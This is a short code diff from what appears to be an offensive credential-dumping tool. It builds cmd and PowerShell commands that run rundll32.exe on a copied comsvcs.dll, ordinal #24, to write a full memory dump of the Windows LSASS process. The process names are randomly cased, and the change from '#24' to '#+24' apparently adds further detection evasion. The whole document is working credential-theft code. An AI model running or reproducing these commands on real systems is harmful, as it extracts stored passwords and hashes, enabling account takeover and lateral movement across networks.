@@ -23,7 +23,7 @@ class DumpMethod(IDumpMethod):
     def get_commands(self):
         tasklist = self.random_case("tasklist")
         lsass = self.random_case("lsass")
-        cmd_command = """for /f "tokens=1,2 delims= " ^%A in ('"{} /fi "Imagename eq {}.ex*" | find "lsass""') do rundll32.exe C:{}{} #24 ^%B {}{} full""".format(
+        cmd_command = """for /f "tokens=1,2 delims= " ^%A in ('"{} /fi "Imagename eq {}.ex*" | find "lsass""') do rundll32.exe C:{}{} #+24 ^%B {}{} full""".format(
             tasklist, lsass, self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
         )
         pwsh_command = """rundll32.exe C:{}{} `#24 (Get-Process {}).Id {}{} full""".format(
